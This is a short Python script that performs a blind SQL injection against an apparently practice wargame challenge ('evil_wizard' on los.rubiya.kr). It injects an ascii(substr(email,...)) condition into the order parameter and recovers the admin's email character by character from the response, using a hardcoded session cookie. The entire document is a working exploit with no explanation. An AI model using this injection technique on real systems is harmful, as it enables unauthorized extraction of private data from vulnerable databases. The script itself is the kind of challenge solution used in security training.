import requests
import string
import time
import re


email=""
a=string.printable
#a=a[:-38]
url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookies = {'PHPSESSID':'aueirceajqi7bj8jk0862achkq'}
for i in range(1,31):
    for j in range(33, 126):
        url="https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=id=\"admin\" and ascii(substr(email,"+str(i)+",1))="+str(j)+" desc"
        res = requests.get(url,cookies=cookies)
        res = res.text
        if re.findall('<table border=1><tr><th>id</th><th>email</th><th>score</th><tr><td>admin', res):
            email+=chr(j)
            print(email)
            break
        else: 
            pass

